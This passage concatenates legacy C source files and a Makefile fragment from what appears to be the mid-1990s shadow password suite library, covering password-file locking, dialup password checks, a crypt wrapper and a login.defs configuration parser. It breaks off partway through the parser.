	test -z "$(MAINTAINERCLEANFILES)" || rm -f $(MAINTAINERCLEANFILES)
	test -z "$(BUILT_SOURCES)" || rm -f $(BUILT_SOURCES)
mostlyclean:  mostlyclean-noinstLIBRARIES mostlyclean-compile \
		mostlyclean-tags mostlyclean-generic

clean:  clean-noinstLIBRARIES clean-compile clean-tags clean-generic \
		mostlyclean 

distclean:  distclean-noinstLIBRARIES distclean-compile distclean-tags \
		distclean-generic clean 
	rm -f config.status

maintainer-clean:  maintainer-clean-noinstLIBRARIES \
		maintainer-clean-compile maintainer-clean-tags \
		maintainer-clean-generic distclean 
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."

.PHONY: default mostlyclean-noinstLIBRARIES distclean-noinstLIBRARIES \
clean-noinstLIBRARIES maintainer-clean-noinstLIBRARIES \
mostlyclean-compile distclean-compile clean-compile \
maintainer-clean-compile tags mostlyclean-tags distclean-tags \
clean-tags maintainer-clean-tags distdir info dvi check installcheck \
install-exec install-data install uninstall all installdirs \
mostlyclean-generic distclean-generic clean-generic \
maintainer-clean-generic clean mostlyclean distclean maintainer-clean

.SUFFIXES:
.SUFFIXES: .c .o

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

AUTOMAKE_OPTIONS = 1.0 foreign

noinst_HEADERS = defines.h dialup.h faillog.h getdef.h \
 groupio.h md5.h port.h prototypes.h \
 pwauth.h pwio.h rcsid.h sgroupio.h shadowio.h

# These files are unneeded for some reason, listed in
# order of appearance:
#
# sources which are not really needed (are they in libc???)
# sources for dbm support (not yet used)
# sources for LIBOBJS (which are normally in libc)
# sources for CRYPTOBJS
# misc header sources

EXTRA_DIST = \
grent.c pwent.c \
\
grdbm.c gsdbm.c pwdbm.c spdbm.c \
grpack.c gspack.c pwpack.c sppack.c \
\
mkdir.c rename.c rmdir.c strdup.c strstr.c \
putgrent.c putpwent.c putspent.c \
sgetgrent.c sgetpwent.c sgetspent.c \
\
md5.c md5crypt.c \
\
gshadow_.h shadow_.h lastlog_.h

# We build libshadow for our tools.

noinst_LIBRARIES = shadow

shadow_SOURCES = commonio.c dialchk.c dialup.c encrypt.c fputsx.c \
 getdef.c getpass.c groupio.c gshadow.c lockpw.c port.c \
 pwauth.c pwio.c rad64.c sgroupio.c shadow.c shadowio.c utent.c

shadow_LIBADD = @LIBOBJS@ @CRYPTOBJS@

INCLUDES = -I$(top_srcdir)/lib
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: commonio.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

/*
 * Some common code moved here from *io.c.  Also, the code used to
 * leak file descriptors (no big deal in normal user commands, but
 * could be a problem in long running daemons) and sometimes failed
 * to remove the temporary lock file.  Hopefully no more.  --marekm
 */

#include "prototypes.h"
#include "defines.h"

#include <sys/stat.h>
#include <utime.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <signal.h>

static int
check_link_count(file)
	const char *file;
{
	struct stat sb;

	if (stat(file, &sb) != 0)
		return 0;

	if (sb.st_nlink != 2)
		return 0;

	return 1;
}

/*
 * do_lock_file - lock a password file
 *
 *	do_lock_file() encapsulates the lock operation.  it returns
 *	TRUE or FALSE depending on the password file being
 *	properly locked.  the lock is set by creating a semaphore
 *	file, LOCK.  FILE is a temporary file name.
 */
int
do_lock_file(file, lock)
	const char *file;
	const char *lock;
{
	int	fd;
	int	pid;
	int	len;
	int	retval;
	char	buf[32];

	/*
	 * Create a lock file which can be switched into place
	 */

	if ((fd = open (file, O_CREAT|O_EXCL|O_WRONLY, 0600)) == -1)
		return 0;

	pid = getpid();
	sprintf (buf, "%d", pid);
	len = strlen(buf) + 1;
	if (write (fd, buf, len) != len) {
		(void) close (fd);
		(void) unlink (file);
		return 0;
	}
	close (fd);

	/*
	 * Simple case first -
	 *	Link fails (in a sane environment ...) if the target
	 *	exists already.  So we try to switch in a new lock
	 *	file.  If that succeeds, we assume we have the only
	 *	valid lock.  Needs work for NFS where this assumption
	 *	may not hold.  The simple hack is to check the link
	 *	count on the source file, which should be 2 iff the
	 *	link =really= worked.
	 */

	if (link(file, lock) == 0) {
		retval = check_link_count(file);
		unlink(file);
		return retval;
	}

	/*
	 * Invalid lock test -
	 *	Open the lock file and see if the lock is valid.
	 *	The PID of the lock file is checked, and if the PID
	 *	is not valid, the lock file is removed.  If the unlink
	 *	of the lock file fails, it should mean that someone
	 *	else is executing this code.  They will get success,
	 *	and we will fail.
	 */

	if ((fd = open(lock, O_RDWR)) == -1) {
		unlink(file);
		errno = EINVAL;
		return 0;
	}
	len = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (len <= 0) {
		unlink(file);
		errno = EINVAL;
		return 0;
	}
	buf[len] = '\0';
	if ((pid = strtol (buf, (char **) 0, 10)) == 0) {
		unlink(file);
		errno = EINVAL;
		return 0;
	}
	if (kill (pid, 0) == 0)  {
		unlink(file);
		errno = EEXIST;
		return 0;
	}
	if (unlink (lock)) {
		(void) close (fd);
		(void) unlink (file);
		return 0;
	}

	/*
	 * Re-try lock -
	 *	The invalid lock has now been removed and I should
	 *	be able to acquire a lock for myself just fine.  If
	 *	this fails there will be no retry.  The link count
	 *	test here makes certain someone executing the previous
	 *	block of code didn't just remove the lock we just
	 *	linked to.
	 */

	retval = 0;
	if (link(file, lock) == 0 && check_link_count(file))
		retval = 1;

	unlink(file);
	return retval;
}

FILE *
fopen_with_umask(name, mode, mask)
	const char *name;
	const char *mode;
	int mask;
{
	FILE *f;

	mask = umask(mask);
	f = fopen(name, mode);
	umask(mask);
	return f;
}

/*
 * Copy fp to backup, set permissions and times from st.
 */
int
create_backup_file(fp, backup, st)
	FILE *fp;
	const char *backup;
	const struct stat *st;
{
	FILE *bkfp;
	int c;

	unlink(backup);
	bkfp = fopen_with_umask(backup, "w", 0777);
	if (bkfp == NULL)
		return -1;
	rewind(fp);
	while ((c = getc(fp)) != EOF) {
		if (putc(c, bkfp) == EOF) {
			fclose(bkfp);
			return -1;
		}
	}
	if (fflush(bkfp)) {
		fclose(bkfp);
		return -1;
	}
	if (fclose(bkfp))
		return -1;
	if (st) {
		struct utimbuf ut;

		chown(backup, st->st_uid, st->st_gid);
		chmod(backup, st->st_mode);
		ut.actime = st->st_atime;
		ut.modtime = st->st_mtime;
		utime(backup, &ut);
	}
	return 0;
}
/*
 * Copyright 1989 - 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: dialchk.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <stdio.h>
#include "prototypes.h"
#include "defines.h"
#include "dialup.h"

/*
 * Check for dialup password
 *
 *	dialcheck tests to see if tty is listed as being a dialup
 *	line.  If so, a dialup password may be required if the shell
 *	is listed as one which requires a second password.
 */

int
dialcheck (tty, sh)
	const char *tty;
	const char *sh;
{
	struct	dialup	*dialup;
	char	*pass;
	char	*cp;

	setduent ();

	if (! isadialup (tty)) {
		endduent ();
		return (1);
	}
	if (! (dialup = getdushell (sh))) {
		endduent ();
		return (1);
	}
	endduent ();

	if (dialup->du_passwd[0] == '\0')
		return (1);

	if (! (pass = getpass ("Dialup Password:")))
		return (0);

	cp = pw_encrypt (pass, dialup->du_passwd);
	bzero (pass, strlen (pass));
	return (strcmp (cp, dialup->du_passwd) == 0);
}
/*
 * Copyright 1989 - 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: dialup.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <stdio.h>
#include "prototypes.h"
#include "defines.h"
#include "dialup.h"

static	FILE	*dialpwd;

void
setduent ()
{
	if (dialpwd)
		rewind (dialpwd);
	else
		dialpwd = fopen (DIALPWD, "r");
}

void
endduent ()
{
	if (dialpwd)
		fclose (dialpwd);

	dialpwd = (FILE *) 0;
}

struct dialup *
fgetduent (fp)
	FILE *fp;
{
	static	struct	dialup	dialup;	/* static structure to point to */
	static	char	sh[128];	/* some space for a login shell */
	static	char	passwd[128];	/* some space for dialup password */
	char	buf[BUFSIZ];
	char	*cp;
	char	*cp2;

	if (! fp)
		return 0;

	if (! fp || feof (fp))
		return ((struct dialup *) 0);

	while (fgets (buf, sizeof buf, fp) == buf && buf[0] == '#')
		;

	if (feof (fp))
		return ((struct dialup *) 0);

	if ((cp = strchr (buf, '\n')))
		*cp = '\0';

	if (! (cp = strchr (buf, ':')))
		return ((struct dialup *) 0);

	if (cp - buf > sizeof sh)	/* something is fishy ... */
		return ((struct dialup *) 0);

	*cp++ = '\0';
	(void) strcpy (sh, buf);
	sh[cp - buf] = '\0';

	if ((cp2 = strchr (cp, ':')))
		*cp2 = '\0';

	if (strlen (cp) + 1 > sizeof passwd) /* something is REALLY fishy */
		return ((struct dialup *) 0);

	(void) strcpy (passwd, cp);

	dialup.du_shell = sh;
	dialup.du_passwd = passwd;

	return (&dialup);
}

struct dialup *
getduent ()
{
	if (! dialpwd)
		setduent ();

	return fgetduent (dialpwd);
}

struct dialup *
getdushell (sh)
	const char *sh;
{
	struct	dialup	*dialup;

	while ((dialup = getduent ())) {
		if (strcmp (sh, dialup->du_shell) == 0)
			return (dialup);

		if (strcmp (dialup->du_shell, "*") == 0)
			return (dialup);
	}
	return ((struct dialup *) 0);
}

int
isadialup (tty)
	const char *tty;
{
	FILE	*fp;
	char	buf[BUFSIZ];
	int	dialup = 0;

	if (! (fp = fopen (DIALUPS, "r")))
		return (0);

	while (fgets (buf, sizeof buf, fp) == buf) {
		if (buf[0] == '#')
			continue;

		buf[strlen (buf) - 1] = '\0';

		if (strcmp (buf, tty) == 0) {
			dialup = 1;
			break;
		}
	}
	fclose (fp);

	return (dialup);
}

int
putduent (dial, fp)
	const struct dialup *dial;
	FILE	*fp;
{
	if (! fp || ! dial)
		return -1;

	if (fprintf (fp, "%s:%s\n", dial->du_shell, dial->du_passwd) == EOF)
		return -1;

	return 0;
}
/*
 * Copyright 1990 - 1993, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: encrypt.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include "prototypes.h"
#include "defines.h"

extern	char	*crypt();
extern char *md5_crypt();

char *
pw_encrypt(clear, salt)
	const char *clear;
	const char *salt;
{
#ifdef HAVE_LIBCRYPT
/* XXX - some systems may have libcrypt which supports only the old
   DES-based algorithm.  We probably want to check (AC_TRY_RUN) to
   see if crypt() in libcrypt supports MD5.  --marekm */
	return crypt(clear, salt);
#else
	static	char	cipher[128];
	char	*cp;
#ifdef SW_CRYPT
	static	int	count;
#endif

#ifdef MD5_CRYPT
	/*
	 * If the salt string from the password file or from crypt_make_salt()
	 * begins with the magic string, use the new algorithm.
	 */
	if (strncmp(salt, "$1$", 3) == 0)
		return md5_crypt(clear, salt);
#endif

#ifdef	SW_CRYPT
	/*
	 * Copy over the salt.  It is always the first two
	 * characters of the string.
	 */

	cipher[0] = salt[0];
	cipher[1] = salt[1];
	cipher[2] = '\0';

	/*
	 * Loop up to ten times on the cleartext password.
	 * This is because the input limit for passwords is
	 * 80 characters.
	 *
	 * The initial salt is that provided by the user, or the
	 * one generated above.  The subsequent salts are gotten
	 * from the first two characters of the previous encrypted
	 * block of characters.
	 */

	for (count = 0;count < 10;count++) {
		cp = crypt (clear, salt);
		if (strlen(cp) != 13)
			return cp;
		strcat (cipher, cp + 2);
		salt = cipher + 11 * count + 2;

		if (strlen (clear) > 8)
			clear += 8;
		else
			break;
	}
#else
	cp = crypt (clear, salt);
	if (strlen(cp) != 13)
		return cp;  /* nonstandard crypt() in libc, better bail out */
	strcpy (cipher, cp);

#ifdef	DOUBLESIZE
	if (strlen (clear) > 8) {
		cp = crypt (clear + 8, salt);
		strcat (cipher, cp + 2);
	}
#endif	/* DOUBLESIZE */
#endif	/* SW_CRYPT */
	return cipher;
#endif  /* HAVE_LIBCRYPT */
}
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include <stdio.h>
#include "defines.h"

#include "rcsid.h"
RCSID("$Id: fputsx.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

char *
fgetsx (buf, cnt, f)
	char *buf;
	int cnt;
	FILE *f;
{
	char *cp = buf;
	char *ep;

	while (cnt > 0) {
		if (fgets (cp, cnt, f) == 0)
			if (cp == buf)
				return 0;
			else
				break;

		if ((ep = strrchr (cp, '\\')) && *(ep + 1) == '\n') {
			if ((cnt -= ep - cp) > 0)
				*(cp = ep) = '\0';
		} else
			break;
	}
	return buf;
}

int
fputsx (s, stream)
	const char *s;
	FILE *stream;
{
	int i;

	for (i = 0;*s;i++, s++) {
		if (putc (*s, stream) == EOF)
			return EOF;

#ifdef GETGRENT  /* The standard getgr*() can't handle that.  --marekm */
		if (i > (BUFSIZ/2)) {
			if (putc ('\\', stream) == EOF ||
			    putc ('\n', stream) == EOF)
				return EOF;

			i = 0;
		}
#endif
	}
	return 0;
}
/*
 * Copyright 1991 - 1994, John F. Haugh II and Chip Rosenthal
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: getdef.c,v 1.4 1996/09/25 03:19:53 marekm Exp $")

#include "prototypes.h"
#include "defines.h"
#include <stdio.h>
#include <ctype.h>

/*
 * A configuration item definition.
 */

struct itemdef {
	const char *name;	/* name of the item			*/
	char *value;		/* value given, or NULL if no value	*/
};

/*
 * This list *must* be sorted by the "name" member.
 */

#define NUMDEFS	(sizeof(def_table)/sizeof(def_table[0]))
static struct itemdef def_table[] = {
	{ "CHFN_AUTH",			NULL },
	{ "CHFN_RESTRICT",		NULL },
	{ "CONSOLE",			NULL },
#ifdef CONSOLE_GROUPS
	{ "CONSOLE_GROUPS",		NULL },
#endif
#ifdef HAVE_LIBCRACK
	{ "CRACKLIB_DICTPATH",		NULL },
#endif
	{ "DEFAULT_HOME",		NULL },
	{ "DIALUPS_CHECK_ENAB",		NULL },
	{ "ENVIRON_FILE",		NULL },
	{ "ENV_HZ",			NULL },
	{ "ENV_PATH" ,			NULL },
	{ "ENV_SUPATH",			NULL },
	{ "ENV_TZ",			NULL },
	{ "ERASECHAR",			NULL },
	{ "FAILLOG_ENAB",		NULL },
	{ "FAIL_DELAY",			NULL },
	{ "FTMP_FILE",			NULL },
	{ "GID_MAX",			NULL },
	{ "GID_MIN",			NULL },
	{ "HUSHLOGIN_FILE",		NULL },
	{ "ISSUE_FILE_ENAB",		NULL },
	{ "KILLCHAR",			NULL },
	{ "LASTLOG_ENAB",		NULL },
	{ "LOGIN_RETRIES",		NULL },
	{ "LOGIN_STRING",		NULL },
	{ "LOGIN_TIMEOUT",		NULL },
	{ "LOG_OK_LOGINS",		NULL },
	{ "LOG_UNKFAIL_ENAB",		NULL },
	{ "MAIL_CHECK_ENAB",		NULL },
	{ "MAIL_DIR",			NULL },
	{ "MAIL_FILE",			NULL },
#ifdef MD5_CRYPT
	{ "MD5_CRYPT_ENAB",		NULL },
#endif
	{ "MOTD_FILE",			NULL },
	{ "NOLOGINS_FILE",		NULL },
	{ "NOLOGIN_STR",		NULL },
	{ "OBSCURE_CHECKS_ENAB",	NULL },
	{ "PASS_ALWAYS_WARN",		NULL },
	{ "PASS_CHANGE_TRIES",		NULL },
	{ "PASS_MAX_DAYS",		NULL },
	{ "PASS_MAX_LEN",		NULL },
	{ "PASS_MIN_DAYS",		NULL },
	{ "PASS_MIN_LEN",		NULL },
	{ "PASS_WARN_AGE",		NULL },
	{ "PORTTIME_CHECKS_ENAB",	NULL },
	{ "QUOTAS_ENAB",		NULL },
	{ "SULOG_FILE",			NULL },
	{ "SU_NAME",			NULL },
	{ "SU_WHEEL_ONLY",		NULL },
#ifdef USE_SYSLOG
	{ "SYSLOG_SG_ENAB",		NULL },
	{ "SYSLOG_SU_ENAB",		NULL },
#endif
	{ "TTYGROUP",			NULL },
	{ "TTYPERM",			NULL },
	{ "TTYTYPE_FILE",		NULL },
	{ "UID_MAX",			NULL },
	{ "UID_MIN",			NULL },
	{ "ULIMIT",			NULL },
	{ "UMASK",			NULL },
};

#ifndef LOGINDEFS
#define LOGINDEFS "/etc/login.defs"
#endif

static char def_fname[] = LOGINDEFS;	/* login config defs file	*/
static int def_loaded = 0;		/* are defs already loaded?	*/

extern long strtol();

static struct itemdef *def_find P_((const char *));
static void def_load P_((void));


/*
 * getdef_str - get string value from table of definitions.
 *
 * Return point to static data for specified item, or NULL if item is not
 * defined.  First time invoked, will load definitions from the file.
 */

char *
getdef_str(item)
	const char *item;
{
	struct itemdef *d;

	if (!def_loaded)
		def_load();

	return ((d = def_find(item)) == NULL ? (char *)NULL : d->value);
}


/*
 * getdef_bool - get boolean value from table of definitions.
 *
 * Return TRUE if specified item is defined as "yes", else FALSE.
 */

int
getdef_bool(item)
	const char *item;
{
	struct itemdef *d;

	if (!def_loaded)
		def_load();

	if ((d = def_find(item)) == NULL || d->value == NULL)
		return 0;

	return (strcmp(d->value, "yes") == 0);
}


/*
 * getdef_num - get numerical value from table of definitions
 *
 * Returns numeric value of specified item, else the "dflt" value if
 * the item is not defined.  Octal (leading "0") and hex (leading "0x")
 * values are handled.
 */

int
getdef_num(item, dflt)
	const char *item;
	int dflt;
{
	struct itemdef *d;

	if (!def_loaded)
		def_load();

	if ((d = def_find(item)) == NULL || d->value == NULL)
		return dflt;

	return (int) strtol(d->value, (char **)NULL, 0);
}


/*
 * getdef_long - get long integer value from table of definitions
 *
 * Returns numeric value of specified item, else the "dflt" value if
 * the item is not defined.  Octal (leading "0") and hex (leading "0x")
 * values are handled.
 */

long
getdef_long(item, dflt)
	const char *item;
	long dflt;
{
	struct itemdef *d;

	if (!def_loaded)
		def_load();

	if ((d = def_find(item)) == NULL || d->value == NULL)
		return dflt;

	return strtol(d->value, (char **)NULL, 0);
}

/*
 * def_find - locate named item in table
 *
 * Search through a sorted table of configurable items to locate the
 * specified configuration option.
 */

static struct itemdef *
def_find(name)
	const char *name;
{
	int min, max, curr, n;

	/*
	 * Invariant - desired item in range [min:max].
	 */

	min = 0;
	max = NUMDEFS-1;

	/*
	 * Binary search into the table.  Relies on the items being
	 * sorted by name.
	 */

	while (min <= max) {
		curr = (min+max)/2;

		if (! (n = strcmp(def_table[curr].name, name)))
			return &def_table[curr];

		if (n < 0)
			min = curr+1;
		else
			max = curr-1;
	}

	/*
	 * Item was never found.
	 */

	fprintf(stderr, "configuration error - unknown item '%s' (notify administrator)\r\n", name);
	SYSLOG((LOG_CRIT, "unknown configuration item `%s'", name));
	return (struct itemdef *) NULL;
}

/*
 * def_load - load configuration table
 *
 * Loads the user-configured options from the default configuration file
 */

static void
def_load()
{
	int i;
	FILE *fp;
	struct itemdef *d;
	char buf[BUFSIZ], *name, *value, *s;

	/*
	 * Open the configuration definitions file.
	 */

	if ((fp = fopen(def_fname, "r")) == NULL) {
/* HACK */ /*		SYSLOG((LOG_CRIT, "cannot open login definitions %s [%m]",
			def_fname)); */
		return;
	}

	/*
	 * Go through all of the lines in the file.
	 */

	while (fgets(buf, sizeof(buf), fp) != NULL) {

		/*
		 * Trim trailing whitespace.
		 */

		for (i = strlen(buf)-1 ; i >= 0 ; --i) {
			if (!isspace(buf[i]))
				break;
		}
		buf[++i] = '\0';

		/*
		 * Break the line into two fields.
		 */

		name = buf + strspn(buf, " \t");	/* first nonwhite */
		if (*name == '\0' || *name == '#')
			continue;			/* comment or empty */

		s = name + strcspn(name, " \t");	/* end of field */
		if (*s == '\0')
			continue;			/* only 1 field?? */

		*s++ = '\0';
		value = s + strspn(s, " \t");		/* next nonwhite */

		/*
